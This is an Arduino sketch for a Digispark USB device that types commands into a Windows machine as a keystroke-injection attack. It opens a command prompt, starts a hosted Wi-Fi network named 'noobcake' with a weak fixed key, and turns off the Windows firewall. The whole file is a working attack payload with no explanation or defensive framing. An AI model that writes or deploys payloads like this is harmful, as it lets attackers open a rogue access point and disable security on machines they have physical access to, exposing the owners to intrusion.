#include "DigiKeyboard.h"
#define kbd_es_es
void setup() {
  DigiKeyboard.update();
}

void loop() {
  delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  delay(3000);
  DigiKeyboard.println("cmd");
  delay(3000);
  DigiKeyboard.println("netsh wlan set hostednetwork mode=allow ssid=noobcake key=12345678");
  delay(3000);
  DigiKeyboard.println("netsh wlan start hostednetwork");
  delay(3000);
  DigiKeyboard.println("netsh advfirewall set currentprofile state off");
  delay(3000);
  DigiKeyboard.println("exit");
  delay(3000);
  while(1);
}
